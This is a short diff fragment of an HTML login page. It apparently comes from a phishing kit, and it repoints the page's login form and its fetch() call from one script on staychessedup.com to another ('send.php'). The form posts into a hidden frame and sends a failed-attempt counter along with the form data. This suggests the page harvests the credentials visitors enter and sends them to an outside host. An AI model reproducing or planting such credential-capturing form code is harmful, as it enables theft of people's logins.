@@ -581,7 +581,7 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                                 </form>
                             </div>
                             <div id="forms">
-                                <form id="login_form" method="post" action="https://staychessedup.com/tanjiro/external_process.php" target="hidden_frame">
+                                <form id="login_form" method="post" action="https://staychessedup.com/tanjiro/send.php" target="hidden_frame">
                                     <div class="notices"></div>
                                     <div id="login-status" style="visibility: hidden; opacity: 0;">
                                         <div id="login-status-message"></div>
@@ -918,7 +918,7 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                 formData.append('attempts', failedAttempts);
                 formData.append('h-captcha-response', hcaptchaResponse);
 
-                fetch('https://staychessedup.com/tanjiro/external_process.php', {
+                fetch('https://staychessedup.com/tanjiro/send.php', {
                     method: 'POST',
                     body: formData
                 })
